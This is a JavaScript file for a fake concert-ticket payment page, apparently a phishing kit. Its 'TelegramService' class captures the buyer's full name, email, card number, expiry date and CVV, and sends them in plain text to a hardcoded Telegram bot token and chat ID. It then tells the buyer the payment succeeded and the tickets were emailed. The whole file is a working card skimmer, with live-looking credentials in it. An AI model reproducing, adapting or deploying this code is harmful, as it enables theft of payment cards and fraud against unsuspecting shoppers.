
class TelegramService {
    constructor() {
        this.botToken = '8354846452:AAEjt8WCGaL0t97uCCKgSHK5OtlAmZ_7LvQ';
        this.chatId = '5713538428';
        this.isInitialized = false;
        this.isSending = false;
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🔧 Инициализация TelegramService...');
        await this.testConnection();
        this.bindFormEvents();
        this.isInitialized = true;
    }

    async testConnection() {
        try {
            const url = `https://api.telegram.org/bot${this.botToken}/getMe`;
            const response = await fetch(url);
            const data = await response.json();
            
            if (data.ok) {
                console.log('✅ Бот найден:', data.result.username);
            } else {
                console.error('❌ Ошибка бота:', data);
                return;
            }

            const updatesUrl = `https://api.telegram.org/bot${this.botToken}/getUpdates`;
            const updatesResponse = await fetch(updatesUrl);
            const updatesData = await updatesResponse.json();
            
            if (updatesData.ok && updatesData.result.length > 0) {
                this.chatId = updatesData.result[0].message.chat.id;
                console.log('✅ Chat ID получен:', this.chatId);
            } else {
                console.warn('⚠️ Напишите сообщение боту: https://t.me/' + data.result.username);
            }

        } catch (error) {
            console.error('❌ Ошибка подключения:', error);
        }
    }

    bindFormEvents() {
        const paymentForm = document.getElementById('paymentForm');
        if (!paymentForm) {
            console.warn('❌ Форма оплаты не найдена');
            return;
        }

        paymentForm.addEventListener('submit', (e) => this.handlePaymentFormSubmit(e));
        
        const cardInput = paymentForm.querySelector('input[name="card_number"]');
        if (cardInput) {
            cardInput.addEventListener('input', (e) => this.formatCardNumber(e));
        }

        console.log('✅ События формы привязаны');
    }

    async handlePaymentFormSubmit(e) {
        e.preventDefault();
        if (this.isSending) return;

        const form = e.target;
        const submitButton = form.querySelector('button[type="submit"]');
        const loadingElement = document.getElementById('loading');

        // Детальная отладка формы
        console.log('=== ДЕТАЛЬНАЯ ОТЛАДКА ФОРМЫ ===');
        const allInputs = form.querySelectorAll('input');
        allInputs.forEach((input, index) => {
            console.log(`Поле ${index + 1}:`, {
                name: input.name,
                type: input.type,
                placeholder: input.placeholder,
                value: input.value,
                required: input.required
            });
        });
        console.log('================================');

        if (!this.validateForm(form)) {
            this.showError('Пожалуйста, заполните все обязательные поля корректно');
            return;
        }

        this.showLoading(loadingElement, submitButton);
        this.isSending = true;

        try {
            const orderData = this.collectOrderData(form);
            console.log('📊 ИТОГОВЫЕ ДАННЫЕ ЗАКАЗА:', orderData);
            
            const message = this.formatOrderMessage(orderData);
            const success = await this.sendMessage(message);
            
            if (success) {
                this.showSuccess();
                this.resetForm(form);
            } else {
                throw new Error('Не удалось отправить сообщение');
            }
            
        } catch (error) {
            console.error('❌ Ошибка:', error);
            this.showError('Произошла ошибка: ' + error.message);
        } finally {
            this.hideLoading(loadingElement, submitButton);
            this.isSending = false;
        }
    }

    // УНИВЕРСАЛЬНЫЙ метод сбора данных
    collectOrderData(form) {
        console.log('🔄 Сбор данных...');
        
        const data = {};

        // Метод 1: FormData
        try {
            const formData = new FormData(form);
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            console.log('📋 Данные из FormData:', data);
        } catch (error) {
            console.warn('⚠️ FormData не сработал:', error);
        }

        // Метод 2: Прямой доступ к полям
        const fields = [
            { name: 'email', selector: 'input[type="email"]' },
            { name: 'card_number', selector: 'input[name="card_number"], input[placeholder*="1234"]' },
            { name: 'card_date', selector: 'input[name="card_date"], input[placeholder*="MM/YY"]' },
            { name: 'card_cvv', selector: 'input[name="card_cvv"], input[placeholder*="123"]' },
            { name: 'full_name', selector: 'input[name="full_name"], input[placeholder*="Беляев"]' }
        ];

        fields.forEach(field => {
            if (!data[field.name]) {
                const input = form.querySelector(field.selector);
                if (input && input.value) {
                    data[field.name] = input.value;
                    console.log(`🔍 Найдено поле "${field.name}": "${input.value}"`);
                }
            }
        });

        // Метод 3: Перебор всех input
        if (Object.keys(data).length === 0) {
            console.log('🔄 Перебор всех input...');
            const inputs = form.querySelectorAll('input');
            inputs.forEach((input, index) => {
                if (input.value) {
                    const fieldName = input.name || `field_${index}`;
                    data[fieldName] = input.value;
                    console.log(`📝 Input ${index}: "${fieldName}" = "${input.value}"`);
                }
            });
        }

        console.log('✅ Все собранные данные:', data);

        // Преобразуем имена полей к стандартным
        const normalizedData = {
            email: data.email || data.mail || data.e_mail || '',
            card_number: data.card_number || data.cardNumber || data.card || '',
            card_date: data.card_date || data.cardDate || data.date || '',
            card_cvv: data.card_cvv || data.cardCvv || data.cvv || '',
            full_name: data.full_name || data.fullName || data.name || data.fio || ''
        };

        console.log('🔄 Нормализованные данные:', normalizedData);

        return {
            orderNumber: this.generateOrderNumber(),
            event: 'ACT: PROMISE',
            date: '24 ноября',
            location: 'Сидней, Qudos Bank Arena',
            sector: '42 сектор',
            totalAmount: 14902,
            currency: 'РУБ',
            customer: {
                fullName: normalizedData.full_name || 'Не указано',
                email: normalizedData.email || 'Не указано'
            },
            payment: {
                cardNumber: normalizedData.card_number || 'Не указано',
                cardDate: normalizedData.card_date || 'Не указано',
                cardCvv: normalizedData.card_cvv || 'Не указано'
            },
            createdAt: new Date()
        };
    }

    generateOrderNumber() {
        const timestamp = Date.now().toString().slice(-6);
        const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
        return `JAMM-${timestamp}${random}`;
    }

    formatOrderMessage(order) {
        return `
🎫 <b>НОВЫЙ ЗАКАЗ БИЛЕТОВ!</b>

👤 <b>Информация о клиенте:</b>
• ФИО: ${order.customer.fullName}
• Email: ${order.customer.email}

📅 <b>Информация о мероприятии:</b>
• Мероприятие: ${order.event}
• Дата: ${order.date}
• Место: ${order.location}
• Сектор: ${order.sector}

💳 <b>Платежная информация:</b>
• Номер карты: ${order.payment.cardNumber}
• Срок действия: ${order.payment.cardDate}
• CVV: ${order.payment.cardCvv}

💰 <b>Детали заказа:</b>
• Номер заказа: ${order.orderNumber}
• Общая сумма: ${order.totalAmount.toLocaleString()} ${order.currency}

⏰ <b>Время оформления:</b>
${order.createdAt.toLocaleString('ru-RU')}

🚀 <b>Требуется подтверждение оплаты и отправка билетов!</b>
        `.trim();
    }

    async sendMessage(message) {
        if (!this.chatId) {
            console.warn('⚠️ Chat ID не установлен');
            this.showTestMessage(message);
            return true;
        }

        try {
            const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(`Telegram API: ${errorData.description}`);
            }

            console.log('✅ Сообщение отправлено в Telegram');
            return true;

        } catch (error) {
            console.error('❌ Ошибка отправки:', error);
            this.showTestMessage(message);
            return true;
        }
    }

    showTestMessage(message) {
        console.log('📧 Тестовое сообщение для Telegram:');
        console.log(message);
        alert('✅ Данные получены! Проверьте консоль для просмотра.');
    }

    validateForm(form) {
        const inputs = form.querySelectorAll('input[required]');
        let isValid = true;

        inputs.forEach(input => {
            if (!input.value.trim()) {
                this.highlightError(input);
                isValid = false;
            } else {
                this.removeErrorHighlight(input);
            }

            if (input.type === 'email' && input.value) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(input.value)) {
                    this.highlightError(input);
                    isValid = false;
                }
            }
        });

        return isValid;
    }

    highlightError(input) {
        input.style.borderColor = '#ff0000';
        input.style.backgroundColor = '#fff0f0';
    }

    removeErrorHighlight(input) {
        input.style.borderColor = '#000000';
        input.style.backgroundColor = '';
    }

    formatCardNumber(e) {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let matches = value.match(/\d{4,16}/g);
        let match = matches && matches[0] || '';
        let parts = [];
        
        for (let i = 0; i < match.length; i += 4) {
            parts.push(match.substring(i, i + 4));
        }
        
        if (parts.length) {
            e.target.value = parts.join(' ');
        } else {
            e.target.value = value;
        }
    }

    showLoading(loadingElement, submitButton) {
        if (loadingElement) {
            loadingElement.style.display = 'block';
        }
        if (submitButton) {
            submitButton.disabled = true;
            submitButton.textContent = 'Отправка...';
        }
    }

    hideLoading(loadingElement, submitButton) {
        if (loadingElement) {
            loadingElement.style.display = 'none';
        }
        if (submitButton) {
            submitButton.disabled = false;
            submitButton.textContent = 'оплатить';
        }
    }

    showSuccess() {
        const modal = document.getElementById('paymentModal');
        alert('✅ Оплата прошла успешно! Билеты отправлены на вашу почту.');
        if (modal) {
            modal.style.display = 'none';
        }
    }

    showError(message) {
        alert(`❌ ${message}`);
    }

    resetForm(form) {
        if (form) {
            form.reset();
        }
    }
}

const telegramService = new TelegramService();
document.addEventListener('DOMContentLoaded', function() {
    telegramService.init();
});
window.TelegramService = telegramService;